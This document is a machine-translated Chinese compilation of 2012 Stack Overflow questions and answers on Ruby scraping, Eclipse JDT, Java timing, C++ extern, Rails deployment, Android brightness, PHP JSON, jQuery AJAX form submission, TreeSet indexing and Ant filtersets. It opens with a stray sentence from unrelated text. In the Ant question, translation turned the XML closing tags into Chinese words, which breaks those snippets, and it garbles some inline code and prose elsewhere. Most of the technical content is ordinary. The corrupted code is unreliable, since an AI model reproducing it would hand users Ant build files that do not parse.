我总是在@interface 之前看到整个协议定义。我相信您也可以将其放入单独的文件中

# ruby - 我在 POST 请求页面中使用 Ruby（使用 RestClient）进行屏幕抓取时遇到了一些问题

> ID：11091789
> 
> 赞同：0
> 
> 时间：2012-06-18T22:05:48.307
> 
> 标签：ruby, screen-scraping, web-scraping, rest-client

我正试图从棕榈滩县治安官办公室的[警察记录纸上获取逮捕数据。](http://www.pbso.org/index.cfm?fa=blotter)

我将搜索范围限制在西棕榈滩市，追溯数据（1974 年 10 月 31 日）。

我正在使用火狐。

当我得到结果时，我打开 FireBug，检查 HTML 选项卡，我可以从页面中看到我想要的信息（即被捕者的姓名、逮捕地址、指控等）。

我检查了 Net>>XHR>>Post 选项卡以找到 POST 请求参数，并将其放入我的代码中，但它返回的 HTML 不包含我正在寻找的重要信息。

有谁知道我是否做错了，或者该网站是否不可抓取？这是我的代码：

```
require 'rubygems'
require 'nokogiri'
require 'restclient'
require 'open-uri'

blotterURL = 'http://www.pbso.org/index.cfm?fa=blotter'

city = "west palm beach"
fromrec = 1

if page = RestClient.post(blotterURL, {'city_name'=>city, 'fromrec'=>fromrec})
    puts Nokogiri::HTML(page)
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T00:17:17.077

这是因为页面正在由 ajax 更新填充。可能 Watir-webdriver 是您的最佳选择。

# java - 将 Eclipse JDT ITypeBinding 转换为类型

> ID：11091791
> 
> 赞同：5
> 
> 时间：2012-06-18T22:05:54.860
> 
> 标签：java, eclipse, abstract-syntax-tree, eclipse-jdt

我正在寻找一种将`org.eclipse.jdt.core.dom.ITypeBinding`实例转换为实例的通用方法`org.eclipse.jdt.core.dom.Type`。虽然我觉得应该有一些 API 调用来做到这一点，但我找不到一个。

根据具体类型，似乎有多种手动执行此操作的方法。

在没有所有这些特殊情况的情况下，是否有任何一般的方法来获取`ITypeBinding`和获取？`Type`接受 a`String`并返回 a`Type`也是可以接受的。

**更新**

从目前的回复来看，看来我确实必须处理所有这些特殊情况。这是这样做的第一次尝试。我敢肯定这并不完全正确，因此感谢您的审查：

```
public static Type typeFromBinding(AST ast, ITypeBinding typeBinding) {
    if( ast == null ) 
        throw new NullPointerException("ast is null");
    if( typeBinding == null )
        throw new NullPointerException("typeBinding is null");

    if( typeBinding.isPrimitive() ) {
        return ast.newPrimitiveType(
            PrimitiveType.toCode(typeBinding.getName()));
    }

    if( typeBinding.isCapture() ) {
        ITypeBinding wildCard = typeBinding.getWildcard();
        WildcardType capType = ast.newWildcardType();
        ITypeBinding bound = wildCard.getBound();
        if( bound != null ) {
            capType.setBound(typeFromBinding(ast, bound)),
                wildCard.isUpperbound());
        }
        return capType;
    }

    if( typeBinding.isArray() ) {
        Type elType = typeFromBinding(ast, typeBinding.getElementType());
        return ast.newArrayType(elType, typeBinding.getDimensions());
    }

    if( typeBinding.isParameterizedType() ) {
        ParameterizedType type = ast.newParameterizedType(
            typeFromBinding(ast, typeBinding.getErasure()));

        @SuppressWarnings("unchecked")
        List<Type> newTypeArgs = type.typeArguments();
        for( ITypeBinding typeArg : typeBinding.getTypeArguments() ) {
            newTypeArgs.add(typeFromBinding(ast, typeArg));
        }

        return type;
    }

    // simple or raw type
    String qualName = typeBinding.getQualifiedName();
    if( "".equals(qualName) ) {
        throw new IllegalArgumentException("No name for type binding.");
    }
    return ast.newSimpleType(ast.newName(qualName));
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-24T08:33:50.343

我刚刚找到了一个可能更可取的替代解决方案。您可以使用[org.eclipse.jdt.core.dom.rewrite.ImportRewrite](http://help.eclipse.org/mars/topic/org.eclipse.jdt.doc.isv/reference/api/org/eclipse/jdt/core/dom/rewrite/ImportRewrite.html)，它管理编译单元的导入语句。使用 Type addImport(ITypeBinding,AST)，您可以创建一个新的 Type 节点，将现有导入考虑在内，并在必要时添加新的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T01:29:54.173

我不确定您想对“类型”对象做什么或为什么需要它。

*   如果您需要说明 TypeBinding 的声明节点，即现有的 Type 节点 - 您可以使用[http://wiki.eclipse.org/JDT/FAQ#From_an_IBinding_to_its_declaring_ASTNode](http://wiki.eclipse.org/JDT/FAQ#From_an_IBinding_to_its_declaring_ASTNode)

*   但是，如果您需要一个新的 ASTNode 用于通过 ASTRewrite 修改源代码，那么您必须自己手工制作并处理所有情况。请注意，您不需要在所有情况下都处理“Type”的所有子类型，例如 UnionType (Java 7) 仅与 catch 块相关。

# java - 用于计算机科学实验的 CPU 时间或 Java 中的用户时间？

> ID：11091797
> 
> 赞同：3
> 
> 时间：2012-06-18T22:06:18.547
> 
> 标签：java, benchmarking, cpu-time

在评估我的算法时，我应该在 Java 中使用 CPU 时间还是用户时间？我在这里使用了信息：[How to get CPU, system, and user time for benchmarking](http://nadeausoftware.com/articles/2008/03/java_tip_how_get_cpu_and_user_time_benchmarking) , to get these values...

开始了：

```
"User time" is the time spent running your application's own code.
"System time" is the time spent running OS code on behalf of your application (such as for I/O). 
```

我们也经常提到“CPU时间”：

```
"CPU time" is user time plus system time. It's the total time spent using a CPU for your application. 
```

哪个最适合 CS 实验？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T22:33:23.340

当然，这取决于您的算法。

如果您的算法本身不执行 I/O，则用户时间是衡量其好坏的最准确的衡量标准。

但是，如果您的算法进行例如基于磁盘的排序，则包含 I/O 的时间更合适。

请注意，尽管 Java VM 本身也运行自己的代码，最值得注意的是 GC，从操作系统的角度来看，这也算作用户时间，所以如果你想真正彻底，你可以尝试通过以下方式最小化 GC 的影响记录 GC 运行时间并从操作系统测量的用户时间中减去它们。（另一方面，您可以争辩说，如果这两种算法在相同的条件下运行，并且其中一个触发的 GC 运行次数比另一个多得多，那么这就是算法本身的错误。）

**更新：**对不起，我刚刚阅读了您链接的页面，当然，如果您测量线程的用户时间，则上述内容不适用，只有当您查看整个（重量级）进程的用户时间时。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-19T07:24:16.807

通常流逝的时间是唯一重要的事情。如果您可以编写一个使用多个内核的程序（这会增加 CPU 时间）但会减少用户等待的时间，那么这是更可取的。经过时间包括 IO、用户和系统时间。

# c++ - extern 必须有权访问类构造函数？

> ID：11091801
> 
> 赞同：0
> 
> 时间：2012-06-18T22:06:49.390
> 
> 标签：c++, class, pointers, constructor, extern

众所周知，有很多方法可以访问班级成员，我现在的问题是。如果类构造函数/解构函数是公共的，则允许“新”使用以及“外部”，如果它是私有的，我可以只创建不允许“新”使用的“GetInstance”类，这对类有好处应该只有 1 个指向它们的实例（例如计算当前登录用户的服务器），并且“新”适用于指向许多对象的类（例如指向新对象的类，例如新玩家登录 int，它会创建一个指向他们每个人的新指针），并且地图将存储一个指向该对象的“新”的指针。问题是，不应该允许“extern”从全局对象私有构造函数访问吗？自从“新” 不允许使用？看看下面的例子：

```
#include <windows.h>
#include <cstdlib>
#include <iostream>
#include <map>

using namespace std;

//CMover.h-------------------------------------
#define MAX_MOVER_NAME 32

class CMover
{
private:
    BOOL m_bInitialized;
    BOOL m_bIsWalking;
    unsigned m_uMetersPercused;
    TCHAR m_szName[MAX_MOVER_NAME+1];

    //CMover( LPCTSTR szMoverName, BOOL bInitialized = TRUE, BOOL bWalking = TRUE, unsigned uMeters = 0 );

public:
        CMover() { };
    virtual ~CMover(){};
};
//---------------------------------------------

//CMover.cpp---------------
CMover g_Mover; //CMover was created in order to have many 'new' usage, so each 'new' object points to a new player
// Making a global object of it is a big failure
//---------------------------

//CServer.h---------------
class CConnectedUsers
{
private:
    CConnectedUsers() {}; //ok, new cannot access, this class should be used as 1 object only
    virtual ~CConnectedUsers() {}; //to count up connected users, 'new' should never be used
public:
    map<u_long,CMover*>m_UserMng;

    //I Could use GetInstance, that any pointers craeted (CConnectedUsers *pCUser = CConnectedUsers::GetInstance() ) would
    //point to it
    static CConnectedUsers* GetInstance( void )
    {
            static CConnectedUsers mObj;
            return &mObj;
    }
};
//------------------------

//CServer.cpp ------
//Or in this case i would like to make a global object, so on CWhatever.cpp that included CServer.h i could use
//(extern CConnectedUsers g_Users;) which is also 1 object-only so no GetInstance would be needed and I would use
//(g_Users.m_UserMng...) directly after external declared
//PROBLEM is, making constructor private regulates the class to be 1 object only, but it doesn't allow external usage
//why is that???
CConnectedUsers g_Users;
//-----------------

//Main.cpp ...etcc

int main( int argc, char *argv[] )
{
    CMover *pMover = new CMover;
    cout << pMover << endl << &pMover << endl; //points to a new object, pointer stored in a region

    CMover *pMov2 = new CMover;
    cout << pMov2 << endl << &pMov2 << endl << endl; //points to a new object, pointer stored in another region

    CConnectedUsers *pCUser = CConnectedUsers::GetInstance();
    CConnectedUsers *pCUser2 = CConnectedUsers::GetInstance();
    cout << pCUser << endl << &pCUser << endl; //points to CConnectedUsers, pointer stored in a region
        cout << pCUser2 << endl << &pCUser2 << endl; //points to same CConnectedUsers, pointer stored in another region

    //also another question is, do I need to check these pointers integrity by doing:
            if( pCUser )
            {
                //??
            }

    system("pause>nul");
    return EXIT_SUCCESS;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-18T22:11:58.710

问题不是`extern`。声明`extern`不会创建对象，也不需要访问构造函数。

但是，`extern`引用必须找到在某处定义的对象，并且一个定义（不仅仅是声明）无法访问构造函数，因为它是命名空间成员，而不是类成员。

这是完全预期和一致的。在命名空间范围内评估的表达式在类之外，因此对私有成员没有特殊特权。

您可以改为使用“锁定和密钥”系统来使公共构造函数无法从任何其他文件中使用。例如：

```
// header file
class Once
{
public:
    struct Forward;
    Once(Forward);
};

extern Once g_singleton;

// implementation file
#include "Once"
namespace { struct Local {}; }
struct Once::Forward : Local {};

Once g_singleton(Once::Forward()); 
```

不可能从任何其他编译单元实例化该类，因为没有其他编译单元具有 的定义`Once::Forward`，它必须按值传递给构造函数。在任何其他编译单元中定义的任何尝试`Once::Forward`都将违反 ODR。

# ruby-on-rails - 我可以将 Rails 应用程序直接部署到我的公司网站上吗？

> ID：11091803
> 
> 赞同：0
> 
> 时间：2012-06-18T22:07:17.697
> 
> 标签：ruby-on-rails, ruby-on-rails-3, deployment

我最初在 Heroku 上托管我的应用程序，但是在我当前的环境中，这不是可接受的部署方法。我们的应用程序中有个人信息，部署到 Heroku 和设置 DNS 转发是不可接受的。无论任何人认为它有多“安全”或“可靠”，在我的情况下都是不可接受的。

我们的主机是 siteturn.com，与 Plesk 10.4.4 集成。如果我以管理员身份 SSH 到我们的网站服务器并输入

```
ruby -v 
```

ruby 1.8.7 (2010-08-16 补丁级别 302) [x86_64-linux]。

```
rails -v 
```

导轨 2.3.5

似乎已经安装了 Ruby 和 Rails（比我需要的旧版本，因为我需要 ruby​​ 1.9.3 和 Rails 3.2）如果我没记错的话，我的主机似乎“支持”rails（为什么它已经安装了它：P）。

我应该如何将我的应用程序直接部署到我的公司网站上？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:12:15.247

拿起一份《Agile Web Development with Rails，第三版》的副本，并阅读它关于部署的内容。那应该让你开始。所需的信息比 SO 答案中的要多。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-19T00:29:19.847

Heroku 是一项很棒的服务，但部署到 Heroku 的便利性让您对托管自己的 Rails 网站所涉及的内容有一个歪曲的看法。Heroku 为您提供了许多困难部分的保护。

例如，仅仅因为安装了 ruby​​ 和 rails 并不一定意味着您可以托管生产 rails 网站。您将需要一个特定于 Rails 的 Web 服务器（例如 nginx 和乘客、独角兽等）。假设您的 Web 应用程序使用数据库，您还需要一个数据库（MySQL 或 Postgres）。另外，正如您所说，您需要升级 ruby​​ 和 rails 的版本。

那只是为了设置服务器。之后，您可以进入部署部分。[Capistrano](https://github.com/capistrano/capistrano)似乎是目前最受欢迎的选择。

看看这个关于部署到虚拟专用服务器的[railscast 剧集](http://railscasts.com/episodes/335-deploying-to-a-vps)，可以很好地了解所涉及的内容。它也短暂地进入了 Capistrano。这不是免费剧集，但我觉得这绝对物有所值。

# eclipse - eclipse build.gradle 有一个红色斜线穿过它，这是什么意思？

> ID：11091806
> 
> 赞同：4
> 
> 时间：2012-06-18T22:07:49.503
> 
> 标签：eclipse, groovy, gradle, egit

我正在运行 Eclipse - Indigo，并为使用 Gradle 构建的 EGit 配置了一个项目。今天我注意到在 Eclipse 的 Package Explorer 中，build.gradle 文件的图标现在有一个红色的小斜线：

![build.gradle 红色斜线](../Images/6bbfa0984b1f5be02c7983ee3957349b.png)

红色的小斜线是从哪里来的，它是什么意思？它是一个 egit 的东西（我不这么认为，文件没有从命令行显示在 git status 中，这个红色斜线图标也没有出现在 Preferences、Team、Git、Label Decorations 中）？我在今天之前从未注意到它，这让我相信它直到今天才出现。

编辑： .gitignore 是否有可能导致日食混乱？这是我的 .gitignore /test-output /logs 的内容

```
# Gradle
.gradle
/build

# OSX
.DS_Store

# Eclipse
.classpath
.project
.tomcatplugin
.settings/
/work
/bin

# Emacs backup files
*~
\#*\#/bin 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T00:07:39.203

红色斜线是 Groovy-Eclipse 的东西。这意味着 gradle 构建文件被解释为一个 groovy 文件，但这个 groovy 文件不在构建路径上（这是有道理的，因为 gradle 构建文件通常不在源文件夹中）。

是不是有些东西不起作用，或者您只是对叠加层感到好奇？

# android - 设置安卓屏幕亮度

> ID：11091808
> 
> 赞同：4
> 
> 时间：2012-06-18T22:07:55.540
> 
> 标签：android, brightness, screen-brightness

我正在尝试将android中的屏幕亮度设置为完全黑暗。第一次效果很好，但是在亮度为0之后，我可以看到屏幕。如何使android屏幕完全变暗？

这是我的代码：

```
WindowManager.LayoutParams params = 

    getWindow().getAttributes();
    params.flags |= LayoutParams.FLAG_KEEP_SCREEN_ON;
    params.screenBrightness = 0.0f;
    getWindow().setAttributes(params); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T22:11:42.883

所有屏幕都具有最低亮度，但不会完全关闭。这是设置`0.0f`。这是硬件限制，因手机而异；无法使用硬件将屏幕设置为完全黑暗。*（您可以移除背光，正如@trumpetlicks 的回答所指出的那样。）*

如果您只是想控制一个应用程序的亮度，您可以使用 an`AbsoluteLayout`来包含您的应用程序，并放置`View`100% 宽度、100% 高度的 a，覆盖在其他所有内容之上，并将其背景设置为`rgba(0, 0, 0, <your alpha value>)`. 我认为这是尽可能接近调光。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T22:13:09.523

如果我正确理解了您的问题，那么您已经有了。您所看到的是几乎所有 LCD 类型屏幕的神器。他们有背光。既然你有`params.flags |= LayoutParams.FLAG_KEEP_SCREEN_ON;`，屏幕（和它的背光）肯定会保持打开状态，输出的实际像素值将是黑色的。这是 LCD 的一个不幸特性，即它们的黑色只有这么黑！

# php - 多级数组使用 php 从 json 文件中获取精确值

> ID：11091811
> 
> 赞同：0
> 
> 时间：2012-06-18T22:08:12.220
> 
> 标签：php, json

我有 htis json 文件：

```
{
    "waluta": "EUR",
    "vat": 1,
    "01_00101": {
        "cena": 130.8,
        "kod": "00101",
        "nazwa": "Span TRICK 1200/1982-ABS",
        "powiazanyZ": "00139"
    },
    "01_00102": {
        "cena": 125.86,
        "kod": "00102",
        "nazwa": "Span TRICK 1200/1864-ABS",
        "powiazanyZ": "00140"
    },
    "02_00122": {
        "cena": 0,
        "kod": "00122",
        "nazwa": "SET to Wicket TRICK 1200 elektrolock RIGHT",
        "powiazanyZ": "00000"
    },
    "02_00123": {
        "cena": 0,
        "kod": "00123",
        "nazwa": "SET to Wicket TRICK 1200 elektrolock LEFT",
        "powiazanyZ": "00000"
    },
    "02_00152": {
        "cena": 0,
        "kod": "00115",
        "nazwa": "Gate ABS 1200/3070 prepared to servomotor ARM 400",
        "powiazanyZ": "00138"
    },
    "02_00138": {
        "cena": 0,
        "kod": "00115",
        "nazwa": "Gate ABS 1200/3070 handle, bolt",
        "powiazanyZ": "00152"
    }
} 
```

在我的 php 代码中，我这样读：

```
$string = file_get_contents("cennik-en.json");
$cennik_a=json_decode($string,true); 
```

我想通过“kod”值访问值。这可能吗？因为按关键值，我认为我可以这样做：

```
$json_a['01_00101'][nazwa]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T23:19:19.953

```
function returnMainKey( $json, $kod) {
    foreach( $json as $key => $value)
        if( is_array( $value))
            if( isset( $value["kod"]) && $value["kod"] == $kod)
                return $key;
    return null;
}

$string = file_get_contents("cennik-en.json");
$cennik_a=json_decode($string,true);
$key = returnMainKey( $cennik_a, "00101");
echo $cennik_a[$key]["nazwa"]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T22:16:15.383

您应该能够像这样获得“kod”值：

```
$kod = $json_a['01_00101']["kod"]; 
```

在上面的示例中，您尝试使用`[nazwa]`何时应该访问，`["nazwa"]`因为键是字符串。

# extjs - 页面刷新监听函数

> ID：11091815
> 
> 赞同：1
> 
> 时间：2012-06-18T22:08:44.413
> 
> 标签：extjs, extjs3

每当刷新或单击页面时都可以添加侦听器吗？

当页面刷新时，它需要调用这个函数：

```
TableTT.hide() 
```

这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:28:15.750

可以通过在处理程序中放置适当的代码来对 HTML 页面重新加载做出反应`window.onload`，更多信息：[http ://roberthahn.ca/articles/2007/02/02/how-to-use-window-onload-the-right-方式/](http://roberthahn.ca/articles/2007/02/02/how-to-use-window-onload-the-right-way/)

一般来说javascript你可以做

```
window.onload = function () {
    TableTT.hide();
} 
```

在[ext-js](http://docs.sencha.com/ext-js/4-1/)中，您可以简单地将函数添加到您的[侦听器](http://docs.sencha.com/ext-js/4-0/#/api/Ext.data.Store-cfg-listeners)

```
var eg = Ext.create('widget.window', { width: 600, height: 800, ... });
eg.on('load', function(){
              TableTT.hide();
             } );
eg.load(); 
```

# java - 是否有类似于 jaxb 的 Unmarshaller.Listener 的杰克逊监听器？

> ID：11091817
> 
> 赞同：2
> 
> 时间：2012-06-18T22:08:55.800
> 
> 标签：java, json, jaxb, jackson

Jackson 是否提供侦听器来拦截反序列化？被序列化和反序列化的对象包含一些存储在 MySql 中的标准对象。我不想创建冗余信息，而是希望在序列化过程中简单地编写对象的代码/ID，并在反序列化过程中通过查找来加载对象。

我目前通过 Jaxb 在 xml 中执行此操作并扩展 Unmarshaller.Listener。我正在将这部分从 xml/jaxb 迁移到 json/jackson。

提前致谢。

# javascript - 如何从 ajax 回调中控制表单提交？

> ID：11091819
> 
> 赞同：0
> 
> 时间：2012-06-18T22:09:03.680
> 
> 标签：javascript, jquery, ajax, callback, form-submit

我最初`return true/false`在我的 ajax 回调中有 ，并意识到它可能不在正确的上下文中被调用，所以我重写了我的函数如下，但它仍然无法正常工作。提交变量是否也没有从回调函数中执行？确认 ( `if .btn-danger`) 有效，但不仅仅是在您点击提交并且不需要确认的情况下）

```
$('#form').submit(function(e){
    var submit = false;
    if($('.btn-danger').length){
        submit = true;
    } else {
        $.ajax({
            url: base_path+"ajax/myajaxfile",
            type: "post",
            data: {
                data1 : $("#amount").val(),
                data2 : $("option:selected").val()
            },
            dataType: "json",
            success: function(data) {
                if (data.needconfirmation === 'true'){
                        $('#edit-submit').val("Confirm");
                        $('#edit-submit').removeClass("btn-primary");
                        $('#edit-submit').addClass("btn-danger");
                        $('#payment-form').after('<span class="warning"> Do you really wanna?</span>');
                } else {
                    submit = true;
                }
            },
            error: function(data) {
                alert("an error has occurred");
            }
        });
    }
    if (submit){
        return true;
    } else {
        return false;
    }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:34:15.157

我认为您的问题是 ajax 调用默认是异步的 - 因此在调用成功函数之前正在评估函数的返回值，因此提交变量仍然为 false。

您需要使 ajax 调用同步：

```
async: false 
```

或者可能更好的是对其进行重组。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:37:36.590

`$.ajax`是异步的，因此您的其余代码会在成功回调发生之前继续执行，因此它的设置`submit = true`不会影响函数末尾的检查。

> 确认（如果 .btn-danger）正在工作，但不仅仅是如果您点击提交并且不需要确认

你怎么知道是否需要确认？您可能希望在您检查的地方添加一个检查`.btn-danger`。

此外，您只需执行以下操作即可清理代码的最后一点

```
return submit; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T22:40:56.113

第一次做 AJAX 最令人困惑的方面之一是异步部分。使用普通的 Javascript（至少是普通的 jQuery），您可以像这样处理提交：

```
$('#form').submit(function(e){
    var submit = /*Figure out if it was a success or not*/;
    if (submit){
        return true;
    } else {
        return false;
    }
}); 
```

一个事件触发一个提交，你确定它是否有效，然后你要么继续，要么不继续。

对于 AJAX 提交，尽管“判断它是否成功”步骤发生在正常的事情流程之外。这意味着您想要做的是始终返回 false；你不知道是否继续，所以不要继续。您的 AJAX 回调（您的 AJAX 调用选项中的“成功：”函数）是“弄清楚”代码是否运行，并且您目前对“成功 = true”有正确的想法......除了它解决时，您原来的提交功能将已经结束（您将返回 false ）。

所以，你需要做的是修改你的成功处理程序来做......无论你提交时通常会发生什么。这可能就像隐藏表单的 form.submit() 一样简单，也可能更复杂；我不知道你的应用程序。希望这能给你一个基本的想法。

# facebook - 如何正确实现 GWT facebook 应用程序的 facebook 登录？

> ID：11091820
> 
> 赞同：1
> 
> 时间：2012-06-18T22:09:04.827
> 
> 标签：facebook, gwt, facebook-oauth

我正在 Facebook 上创建一个应用程序，并试图找出验证和登录应用程序的正确方法是什么。我不希望在他们注销 Facebook 并且当前使用 OAuth 2.0 时可以访问它，即使登录 Facebook 的顶部栏在那里，该应用程序仍然可以通过转到 apps.facebook.com/myappname 来完全运行。

这是我的`onModuleLoad`：

```
public void onModuleLoad() {
  AuthRequest req = new AuthRequest(FACEBOOK_AUTH_URL, FACEBOOK_CLIENT_ID);
  AUTH.login(req, new Callback<String, Throwable>() {
    @Override
    public void onSuccess(String token) {
      f_token = token;
      startAppAfterLogin();
    }

    @Override public void onFailure(Throwable caught) {
      Window.Location.assign("https://www.facebook.com/login.php");
    }
  });
} 
```

显然，`startAppAfterLogin()`当他们注销时仍然会被调用，有人知道该怎么做吗？

# java - Java 计时，System.nanoTime() 比 System.currentTimeMillis() 更胜一筹，但它会在睡眠期间持续存在吗？

> ID：11091824
> 
> 赞同：4
> 
> 时间：2012-06-18T22:09:43.233
> 
> 标签：java, android, timer, time-precision

我正在尝试实现一个计时器，它可以用于短（秒）事件或更长（小时等）事件。

理想情况下，它应该在 CPU 关闭时持续存在，例如，电池没电了。如果我使用 System.currentTimeMillis() 设置开始时间并使用相同的函数设置结束时间，它几乎适用于所有情况，除了在闰秒、闰年、夏令时更改等期间......或者，如果用户只是更改时间（我已经验证了这一点）。这是在Android系统上，顺便说一句。

相反，如果我使用 System.nanoTime()，除了可能更准确之外，它不会出现时间变化等常见的“困难时间”问题。我的问题是，System.nanoTime() 是否测量纳秒某个任意时间，在“困难时期”？我不确定正确的术语是什么，但例如，System.nanoTime() 会在 X 处运行，然后 X+1 小时后，系统关闭（例如，Android 设备上的电池没电了），然后是 X +10 小时，系统启动，此时运行 System.nanoTime() 会返回 10 小时吗？或者它会返回 1 小时（因为当系统关闭/休眠时 nanoTime 使用的“计数器”可能不会运行？）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:30:55.247

android.os.SystemClock.elapsedRealtime() - 自系统启动以来的毫秒数，包括处于睡眠状态的时间。这应该是你最好的选择。

我认为您无法测量android中的关闭时间。

有关更多信息，最好查看 android 系统时钟页面。[http://developer.android.com/reference/android/os/SystemClock.html](http://developer.android.com/reference/android/os/SystemClock.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T22:14:19.850

它[是未定义的](http://docs.oracle.com/javase/7/docs/api/java/lang/System.html#nanoTime%28%29)：

> “返回的值表示自某个固定但任意的原始时间以来的纳秒（可能在将来，因此值可能为负数）。Java 虚拟机实例中此方法的所有调用都使用相同的来源；其他虚拟机实例可能使用不同的来源。”

为简单起见，我们会说当您在时间 X 运行它时，原点是 X（这是允许的）。这意味着它将返回 0，然后在 VM 实例中，时间将以与正常时钟相同的速率流逝。

当您使用`Thread.sleep`时，这不会更改 VM 实例，因此不会对其进行特殊处理。

但是，在设备重新启动后，您将处于不同的 VM 实例中。因此，不再保证 X 是原点。

# list - 是否有一个 Java 集合，其对象是唯一的（如在集合中）但能够获取某个对象的索引/位置（如在列表中）？

> ID：11091825
> 
> 赞同：1
> 
> 时间：2012-06-18T22:09:45.587
> 
> 标签：list, set, unique

我有一组有序的、唯一的对象。我目前正在使用 TreeSet 以获得正确的排序。但是，集合没有获取索引的能力。

我目前的实现很好，但不一定直观。

```
TreeSet<T> treeSet = new TreeSet<T>(Comparable c);
// Omitted: Add items to treeSet //
int index = new ArrayList<T>(treeSet)().indexOf(object); 
```

有没有更简单的方法来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-10T17:17:14.813

我还遇到了在 TreeMap 中的某个位置查找元素的问题。我使用权重增强了树，允许通过索引访问元素并在索引处查找元素。该项目称为 indexed-tree-map [https://github.com/geniot/indexed-tree-map](https://github.com/geniot/indexed-tree-map)。在有序映射的索引中查找元素或元素的索引的实现不是基于线性迭代，而是基于树二分查找。更新树的权重也是基于爬上树到根。所以没有线性迭代。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T22:32:04.167

[`treeSet.headSet(object).size()`](http://docs.oracle.com/javase/6/docs/api/java/util/SortedSet.html#headSet%28E%29)应该做的伎俩：

```
import java.util.SortedSet;
import java.util.TreeSet;

class Test {

  public static void main(String[] args) {

    SortedSet<String> treeSet = new TreeSet<String>();
    String first = "index 0";
    String second = "index 1";
    treeSet.add(first);
    treeSet.add(second);

    int one = treeSet.headSet(second).size();

    System.out.println(one);
    // 1
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T22:18:59.853

Java没有这样的东西。以下是您可以做的一些建议：

1.  保持原样，因为这并没有想象的那么糟糕；）
2.  使用迭代器遍历您的元素
3.  编写一个扩展 TreeSet 的包装类并添加获取功能。
4.  结帐[番石榴](https://code.google.com/p/guava-libraries/)，看看他们是否有这样的东西（我没用过，所以我不知道，对不起！）
5.  创建一个数组`Object[] arrayView = mySet.toArray();`，然后从中获取元素（这在性能和内存方面有点愚蠢）

# java - 如何在 Eclipse 上设置 Java Opengl？

> ID：11091826
> 
> 赞同：10
> 
> 时间：2012-06-18T22:09:52.960
> 
> 标签：java, eclipse, opengl

所以我刚刚进入 Java Opengl，我使用 eclipse 作为我的 IDE。我检查了 Java Opengl 网站，但它并不能真正帮助您安装它。谁能给我一些关于如何安装 Java Opengl 以便它可以在 eclipse 中使用的步骤？

我正在使用 Windows 64 顺便说一句。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T22:45:36.960

您需要安装 JOGL 或 LWJGL 才能在 Java 中使用 OpenGL

*   JOGL 说明：http: [//jogamp.org/wiki/index.php/Jogl_Tutorial](http://jogamp.org/wiki/index.php/Jogl_Tutorial)
*   LWJGL：[https](https://www.lwjgl.org/guide) ://www.lwjgl.org/guide （应该有版本安装链接指向github）

ps：一些 JOGL 与 LWJGL 的讨论：[https ://stackoverflow.com/questions/3644872/revisiting-the-issue-of-lwjgl-vs-jogl-for-game-programming](https://stackoverflow.com/questions/3644872/revisiting-the-issue-of-lwjgl-vs-jogl-for-game-programming)

# ant - ant filterset 属性范围

> ID：11091827
> 
> 赞同：3
> 
> 时间：2012-06-18T22:09:56.970
> 
> 标签：ant

我想使用过滤器集来写出替换设置为 ant 属性的变量的文件。如果我有一个嵌套的过滤器集，我可以传递该属性，但不能传递一个 refid；我正在重用过滤器集，所以我想使用 refid。

foo.old 只包含`foo=@foo@`

这有效：

```
<target name="filterset-test1">
  <property name="bar" value="这里是 foo" />
  <copy file="foo.old" tofile="foo.new1">
    <filterset begintoken="@" endtoken="@">
      <filter token="foo" value="${bar}" />
    </filterset>
  </复制>
</目标>

```

这无法替换令牌：

```
<filterset id="test-filters" begintoken="@" endtoken="@">
  <filter token="foo" value="${bar}" />
</filterset>
<target name="filterset-test3">
  <property name="bar" value="property 不通过" />
  <copy file="foo.old" tofile="foo.new3">
    <filterset refid="测试过滤器" />
  </复制>
</目标>

```

有没有办法做到后者？我也尝试过编写一个属性文件并将其用作`filtersfile`属性。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-19T00:32:48.303

问题似乎出在顶级过滤器集中：

```
<filterset id="test-filters" begintoken="@" endtoken="@">
  <filter token="foo" value="${bar}" />
</filterset> 
```

该属性`bar`未定义。移动`bar`外部目标的属性定义`filterset-test3`应该有效：

```
<?xml version="1.0" encoding="UTF-8" ?>
<project name="filter-test">

  <property name="bar" value="property doesn't pass thru" />

  <filterset id="test-filters" begintoken="@" endtoken="@">
    <filter token="foo" value="${bar}" />
  </filterset>

  <target name="filterset-test3">
    <copy file="foo.old" tofile="foo.new3">
      <filterset refid="test-filters" />
    </copy>
  </target>
</project> 
```

# youtube - 通过 JWPlayer 嵌入 YouTube 视频，“在 YouTube 上播放”被切断

> ID：11091829
> 
> 赞同：0
> 
> 时间：2012-06-18T22:10:02.960
> 
> 标签：youtube, tooltip, embed, overflow, jwplayer

我正在使用 JWPlayer 在网站上嵌入多个 YouTube 视频。在右下角，有通常的 YouTube 徽标。

悬停时出现的文本/工具提示被视频或视频的容器剪辑。

检查所有父元素，我没有看到任何设置为溢出：隐藏的内容。任何人遇到这种情况，或者更好的是，有一个解决方案来移动工具提示，或者让它不被视频、容器或对象剪辑？

